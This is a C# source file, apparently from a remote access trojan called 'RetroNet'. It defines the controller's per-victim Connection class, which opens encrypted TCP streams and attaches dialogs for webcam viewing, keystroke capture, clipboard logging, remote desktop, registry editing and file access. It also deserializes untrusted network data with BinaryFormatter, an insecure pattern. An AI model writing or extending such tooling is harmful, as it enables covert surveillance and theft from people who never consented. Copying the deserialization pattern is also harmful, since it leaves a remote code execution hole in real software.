using RetroNet.Forms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RetroNet.Classes
{
    public class Connection
    {
        private TcpClient _client;
        private BinaryFormatter _formatter;

        private bool _secured;
        private object _encLock;
        private object _decLock;
        private ICryptoTransform _encryptor;
        private ICryptoTransform _decryptor;

        public delegate void OnDisconnect(Connection client);
        public event OnDisconnect OnDisconnectEvent;

        public delegate void OnDataReceived(Connection client, byte[] data);
        public event OnDataReceived OnDataReceivedEvent;

        public delegate void OnDataSent(Connection client, byte[] data);
        public event OnDataSent OnDataSentEvent;

        public delegate void OnFileProgress(Connection client, int id, double progress);
        public event OnFileProgress OnUploadProgressEvent;
        public event OnFileProgress OnDownloadProgressEvent;

        public Connection(TcpClient client)
        {
            _client = client;
            _formatter = new BinaryFormatter();

            _secured = false;
            _encLock = new object();
            _decLock = new object();
            _encryptor = null;
            _decryptor = null;

            IPAddress = ((IPEndPoint)_client.Client.RemoteEndPoint).Address;
            Port = ((IPEndPoint)_client.Client.LocalEndPoint).Port;

            RemoteDesktop = new RemoteDesktopDialog(this);
            WebcamViewer = new WebcamDialog(this);
            FileExplorer = new FileExplorerDialog(this);
            ProcessManager = new ProcessManagerDialog(this);
            KeystrokeCapturer = new KeystrokeCapturerDialog(this);
            ClipboardLogger = new ClipboardLoggerDialog(this);
            ApplicationHandler = new ApplicationHandlerDialog(this);
            RegistryEditor = new RegistryEditorDialog(this);
            StartupMonitor = new StartupMonitorDialog(this);
            ServiceAdminister = new ServiceAdministerDialog(this);
            InstantMessenger = new InstantMessengerDialog(this);

            Downloads = new Dictionary<int, Download>();
            Uploads = new Dictionary<int, Upload>();
        }

        public void beginRead()
        {
            _client.GetStream().BeginRead(new byte[] { }, 0, 0, read, null);
        }

        public void read(IAsyncResult ar)
        {
            try
            {
                if (_client.GetStream().DataAvailable && _client.GetStream().CanRead && OnDataReceivedEvent != null)
                {
                    byte[] data = (byte[])_formatter.Deserialize(_client.GetStream());

                    lock (_decLock)
                    {
                        if (_secured)
                            data = _decryptor.TransformFinalBlock(data, 0, data.Length);
                    }

                    if (OnDataReceivedEvent != null)
                        OnDataReceivedEvent(this, data);
                }

                _client.GetStream().Flush();
                _client.GetStream().BeginRead(new byte[] { }, 0, 0, read, null);
            }
            catch
            {
                if (OnDisconnectEvent != null)
                    OnDisconnectEvent(this);
            }
        }

        public void send(byte[] data)
        {
            try
            {
                lock (_encLock)
                {
                    if (_secured)
                        data = _encryptor.TransformFinalBlock(data, 0, data.Length);
                }

                NetworkStream stream = _client.GetStream();

                lock (stream)
                    _formatter.Serialize(stream, data);

                if (OnDataSentEvent != null)
                    OnDataSentEvent(this, data);
            }
            catch { }
        }

        public void createEncryption(byte[] key, byte[] iv)
        {
            RijndaelManaged r = new RijndaelManaged();

            lock (_encLock)
                _encryptor = r.CreateEncryptor(key, iv);

            lock (_decLock)
                _decryptor = r.CreateDecryptor(key, iv);

            _secured = true;
        }

        public void updateUploadProgress(int id, double progress)
        {
            if (OnUploadProgressEvent != null)
                OnUploadProgressEvent(this, id, progress);
        }

        public void updateDownloadProgress(int id, double progress)
        {
            if (OnDownloadProgressEvent != null)
                OnDownloadProgressEvent(this, id, progress);
        }

        public IPAddress IPAddress { get; private set; }

        public int Port { get; private set; }

        public RemoteDesktopDialog RemoteDesktop { get; set; }

        public WebcamDialog WebcamViewer { get; set; }

        public FileExplorerDialog FileExplorer { get; set; }

        public ProcessManagerDialog ProcessManager { get; set; }

        public KeystrokeCapturerDialog KeystrokeCapturer { get; set; }

        public ClipboardLoggerDialog ClipboardLogger { get; set; }

        public ApplicationHandlerDialog ApplicationHandler { get; set; }

        public RegistryEditorDialog RegistryEditor { get; set; }

        public StartupMonitorDialog StartupMonitor { get; set; }

        public ServiceAdministerDialog ServiceAdminister { get; set; }

        public InstantMessengerDialog InstantMessenger { get; set; }

        public Dictionary<int, Download> Downloads { get; private set; }

        public Dictionary<int, Upload> Uploads { get; private set; }
    }
}
